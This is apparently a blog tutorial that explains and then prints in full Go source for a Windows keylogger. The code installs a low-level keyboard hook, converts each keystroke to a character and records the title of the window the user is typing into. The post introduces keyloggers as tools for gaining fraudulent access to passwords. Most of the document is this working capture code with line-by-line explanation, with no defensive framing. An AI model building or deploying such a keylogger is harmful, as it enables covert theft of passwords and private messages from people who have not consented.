---
title: "Writing a Keylogger in Go"
date: 2022-10-16T20:30:23+02:00
draft: false
---

### What is a Keylogger
a computer program that records every keystroke made by a computer user, especially in order to gain fraudulent access to passwords and other confidential information.

## Code Explanation:
### Imports:
```go
import (
	"fmt"
	"os"
	"os/signal"

	"syscall"
	"unsafe"

	"github.com/moutend/go-hook/pkg/keyboard"
	"github.com/moutend/go-hook/pkg/types"
	"golang.org/x/sys/windows"
)
```
The 4 most important imported modules are syscall, github.com/moutend/go-hook/pkg/keyboard, github.com/moutend/go-hook/pkg/types, and golang.org/x/sys/windows


[go-hook](https://github.com/moutend/go-hook/) is package by github user moutend that allows you to directly interface with low level windows keyboard hooks.
Package windows and syscall contain an interface to the low-level operating system primitives.


### Variables:
* mod: store the loaded *user32.dll* library
    ```go
	mod = windows.NewLazyDLL("user32.dll")
    ```


* procGetKeyState: store the function GetKeyState from *user32.dll*. This function gets the state of the specified key (is the specified key pressed or not)
    ```go
	procGetKeyState         = mod.NewProc("GetKeyState")
    ```


* procGetKeyboardLayout: store the function GetKeyboardLayout from *user32.dll*. This function gets the layout of the current keyboard
    ```go
    procGetKeyboardLayout   = mod.NewProc("GetKeyboardLayout")
    ```


* procGetKeyboardState: store the function GetKeyboardState from *user32.dll*. This function gets the state of the entire keyboard (which keys are pressed)
    ```go
    procGetKeyboardState    = mod.NewProc("GetKeyboardState")
    ```


* procGetForegroundWindow: store the function GetForegroundWindow from *user32.dll*. This function gets the current foreground window
    ```go 
    procGetForegroundWindow = mod.NewProc("GetForegroundWindow")
    ```


* procToUnicodeEx: store the function ToUnicodeEx from *user32.dll*. This function converts scancodes returned by our keyboard hook to unicode
    ```go
    procToUnicodeEx         = mod.NewProc("ToUnicodeEx")
    ```


* procGetWindowText: store the function GetWindowText from *user32.dll*. This function gets the text of the window specified
    ```go
    procGetWindowText       = mod.NewProc("GetWindowTextW")
    ```


* procGetWindowTextLength: store the function GetWindowTextLength from *user32.dll*. This function gets the length of the text of a specified window 
    ```go
	procGetWindowTextLength = mod.NewProc("GetWindowTextLengthW")
    ```

```go
var (
	mod = windows.NewLazyDLL("user32.dll")

	procGetKeyState         = mod.NewProc("GetKeyState")
	procGetKeyboardLayout   = mod.NewProc("GetKeyboardLayout")
	procGetKeyboardState    = mod.NewProc("GetKeyboardState")
	procGetForegroundWindow = mod.NewProc("GetForegroundWindow")
	procToUnicodeEx         = mod.NewProc("ToUnicodeEx")
	procGetWindowText       = mod.NewProc("GetWindowTextW")
	procGetWindowTextLength = mod.NewProc("GetWindowTextLengthW")
)
```


### Types:
* HANDLE: uintptr type for HWND.
* HWND: HANDLE type for storing window hwnd.

```go
type (
	HANDLE uintptr
	HWND   HANDLE
)
```

### Functions:
```go
func GetWindowTextLength(hwnd HWND) int {
	ret, _, _ := procGetWindowTextLength.Call(
		uintptr(hwnd))

	return int(ret)
}
```
GetWindowTextLength is a function that takes the HWND of the window and returns the length of the window text.  


```go
func GetWindowText(hwnd HWND) string {
	textLen := GetWindowTextLength(hwnd) + 1

	buf := make([]uint16, textLen)
	procGetWindowText.Call(
		uintptr(hwnd),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(textLen))

	return syscall.UTF16ToString(buf)
}

```
GetWindowText is a function that takes the HWND of the window and returns the windows' text by storing it in a buffer then converting it to a string.  


```go
func GetForegroundWindow() uintptr {
	hwnd, _, _ := procGetForegroundWindow.Call()
	return hwnd
}
```
GetForegroundWindow is a function that returns the currently focused window.  


```go
func Run(key_out chan rune, window_out chan string) error {
	// Buffer size is depends on your need. The 100 is placeholder value.
	keyboardChan := make(chan types.KeyboardEvent, 1024)

	if err := keyboard.Install(nil, keyboardChan); err != nil {
		return err
	}

	defer keyboard.Uninstall()

	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, os.Interrupt)

	fmt.Println("start capturing keyboard input")

	for {
		select {
		case <-signalChan:
			fmt.Println("Received shutdown signal")
			return nil
		case k := <-keyboardChan:
			if hwnd := GetForegroundWindow(); hwnd != 0 {
				if k.Message == types.WM_KEYDOWN {
					key_out <- VKCodeToAscii(k)
					window_out <- GetWindowText(HWND(hwnd))
				}
			}
		}
	}
}

```
Function Run() runs the keylogger.  
First initialize a buffered channel to store keyboard events then install the low level keyboard hook using `keyboard.Install()`.  
defer uninstallation of the hook so that it gets uninstalled when the function returns.
Then in an infinite for loop get the foreground window using GetForegroundWindow() and when a key is pressed send the key to the key_out channel and the window name to window_out channel.  

# Code:

```go
package main

import (
	"fmt"
	"os"
	"os/signal"

	"syscall"
	"unsafe"

	"github.com/moutend/go-hook/pkg/keyboard"
	"github.com/moutend/go-hook/pkg/types"
	"golang.org/x/sys/windows"
)


var (
	mod = windows.NewLazyDLL("user32.dll")

	procGetKeyState         = mod.NewProc("GetKeyState")
	procGetKeyboardLayout   = mod.NewProc("GetKeyboardLayout")
	procGetKeyboardState    = mod.NewProc("GetKeyboardState")
	procGetForegroundWindow = mod.NewProc("GetForegroundWindow")
	procToUnicodeEx         = mod.NewProc("ToUnicodeEx")
	procGetWindowText       = mod.NewProc("GetWindowTextW")
	procGetWindowTextLength = mod.NewProc("GetWindowTextLengthW")
)

type (
	HANDLE uintptr
	HWND   HANDLE
)

// Gets length of text of window text by HWND
func GetWindowTextLength(hwnd HWND) int {
	ret, _, _ := procGetWindowTextLength.Call(
		uintptr(hwnd))

	return int(ret)
}

// Gets text of window text by HWND
func GetWindowText(hwnd HWND) string {
	textLen := GetWindowTextLength(hwnd) + 1

	buf := make([]uint16, textLen)
	procGetWindowText.Call(
		uintptr(hwnd),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(textLen))

	return syscall.UTF16ToString(buf)
}

// Gets current foreground window
func GetForegroundWindow() uintptr {
	hwnd, _, _ := procGetForegroundWindow.Call()
	return hwnd
}

// Runs the keylogger
func Run(key_out chan rune, window_out chan string) error {
	keyboardChan := make(chan types.KeyboardEvent, 1024)

	if err := keyboard.Install(nil, keyboardChan); err != nil {
		return err
	}

	defer keyboard.Uninstall()

	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, os.Interrupt)

	fmt.Println("start capturing keyboard input")

	for {
		select {
		case <-signalChan:
			fmt.Println("Received shutdown signal")
			return nil
		case k := <-keyboardChan:
			if hwnd := GetForegroundWindow(); hwnd != 0 {
				if k.Message == types.WM_KEYDOWN {
					key_out <- VKCodeToAscii(k)
					window_out <- GetWindowText(HWND(hwnd))
				}
			}
		}
	}
}

// Converts from Virtual-Keycode to Ascii rune
func VKCodeToAscii(k types.KeyboardEvent) rune {
	var buffer []uint16 = make([]uint16, 256)
	var keyState []byte = make([]byte, 256)

	n := 10
	n |= (1 << 2)

	procGetKeyState.Call(uintptr(k.VKCode))

	procGetKeyboardState.Call(uintptr(unsafe.Pointer(&keyState[0])))
	r1, _, _ := procGetKeyboardLayout.Call(0)

	procToUnicodeEx.Call(uintptr(k.VKCode), uintptr(k.ScanCode), uintptr(unsafe.Pointer(&keyState[0])),
		uintptr(unsafe.Pointer(&buffer[0])), 256, uintptr(n), r1)

	if len(syscall.UTF16ToString(buffer)) > 0 {
		return []rune(syscall.UTF16ToString(buffer))[0]
	}
	return rune(0)
}
```